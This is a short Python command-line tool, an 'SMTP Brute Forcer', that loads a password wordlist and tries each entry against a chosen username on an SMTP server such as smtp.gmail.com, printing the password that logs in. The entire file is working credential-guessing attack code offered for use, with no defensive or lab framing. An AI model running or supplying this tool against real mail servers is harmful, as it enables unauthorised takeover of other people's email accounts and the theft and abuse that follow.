import smtplib
import argparse
from time import sleep

def brute_force_smtp(target, username, wordlist, use_ssl=False):
    """
    Function to perform brute force attack on SMTP server with provided username and password wordlist
    Args:
    - target: SMTP server address (e.g., 'smtp.gmail.com')
    - username: the username to use in the brute-force attempt
    - wordlist: list of potential passwords to try
    - use_ssl: whether to use SSL (for port 465) or TLS (for port 587)
    """
    try:
        if use_ssl:
            # Connect to SMTP server using SSL (port 465)
            server = smtplib.SMTP_SSL(target, 465)
        else:
            # Connect to SMTP server using TLS (port 587)
            server = smtplib.SMTP(target, 587)
            server.starttls()  # Upgrade the connection to TLS

        server.set_debuglevel(0)
        print(f"Attempting to brute force on {target} with username {username}")

        for password in wordlist:
            try:
                server.login(username, password)
                print(f"Success: Found password '{password}'")
                break
            except smtplib.SMTPAuthenticationError:
                print(f"Failed: {password}")
                sleep(1)  # Delay to prevent rapid-fire requests
            except Exception as e:
                print(f"Error occurred: {e}")
                break

        server.quit()
    except smtplib.SMTPException as e:
        print(f"Error connecting to server: {e}")

def main():
    # Setup argument parser
    parser = argparse.ArgumentParser(description="SMTP Brute Forcer")
    parser.add_argument("target", help="SMTP server address (e.g., smtp.gmail.com)")
    parser.add_argument("username", help="Username to attempt to brute force")
    parser.add_argument("wordlist", help="File containing password wordlist (one password per line)")
    parser.add_argument("--ssl", action="store_true", help="Use SSL (port 465) instead of TLS (port 587)")

    args = parser.parse_args()

    # Read password list from the given wordlist file
    try:
        with open(args.wordlist, 'r') as file:
            passwords = file.readlines()
            passwords = [line.strip() for line in passwords]  # Remove newline characters
    except FileNotFoundError:
        print("Wordlist file not found!")
        return

    # Perform brute force attack
    brute_force_smtp(args.target, args.username, passwords, use_ssl=args.ssl)

if __name__ == "__main__":
    main()
